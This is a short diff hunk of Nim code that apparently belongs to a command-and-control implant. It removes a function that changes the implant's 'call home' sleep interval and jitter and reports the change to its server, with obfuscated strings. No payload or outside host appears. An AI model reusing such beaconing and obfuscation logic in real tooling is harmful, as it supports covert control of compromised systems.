@@ -573,21 +573,6 @@ proc speak(text: string): bool =
     return is_success
 
 
-proc change_sleep_time(timeframe: int,  jitter_percent: int): bool =
-    var is_success: bool
-    call_home_timeframe = timeframe
-    call_home_jitter_percent = jitter_percent
-    
-    var data = {
-        protectString("sleep_timeframe"): $call_home_timeframe,
-        protectString("sleep_jitter_percent"): $call_home_jitter_percent,
-        protectString("is_success"): $is_success
-    }.toOrderedTable()
-    
-    is_success = post_data(client, protectString("sleep") , $data)
-    return is_success
-
-
 #########################
 ######## Helpers ########
 #########################
